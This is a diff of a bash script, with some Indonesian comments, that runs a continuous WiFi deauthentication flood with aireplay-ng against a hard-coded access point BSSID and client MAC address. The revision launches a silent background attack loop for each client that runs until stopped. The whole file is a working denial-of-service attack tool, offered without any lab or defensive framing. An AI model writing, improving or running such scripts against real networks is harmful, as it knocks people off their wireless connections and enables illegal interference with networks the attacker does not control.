@@ -1,23 +1,21 @@
 #!/bin/bash
 
-INTERFACE="wlp3s0"
-BSSID="24:46:E4:1E:F5:7C"  # Ganti dengan BSSID target
-DEAUTH_COUNT=0  # 0 = terus-menerus
+INTERFACE="wlp3s0mon"
+BSSID="24:46:E4:1E:F5:7C"
+DEAUTH_COUNT=0  # 0 = flood
 
-# Daftar klien (STATION MAC)
 CLIENTS=(
-    "56:46:9D:42:09:46"
-    "04:E5:98:17:64:87"
     "6A:B1:E1:D5:77:A5"
 )
 
-echo "[*] Start Deauth Attack to Client ${#CLIENTS[@]} ..."
+echo "[*] Starting parallel deauth for ${#CLIENTS[@]} clients..."
 
-while true; do
-    for CLIENT in "${CLIENTS[@]}"; do
-        echo ">> Attack $CLIENT"
-        sudo aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID -c $CLIENT $INTERFACE --ignore-negative-one
-        sleep 1
-    done
+for CLIENT in "${CLIENTS[@]}"; do
+    echo "[*] Starting attack on $CLIENT"
+    while true; do
+        sudo aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID -c $CLIENT $INTERFACE --ignore-negative-one > /dev/null 2>&1
+    done &
 done
 
+echo "[*] All attacks running in background. Press Ctrl+C to stop."
+wait
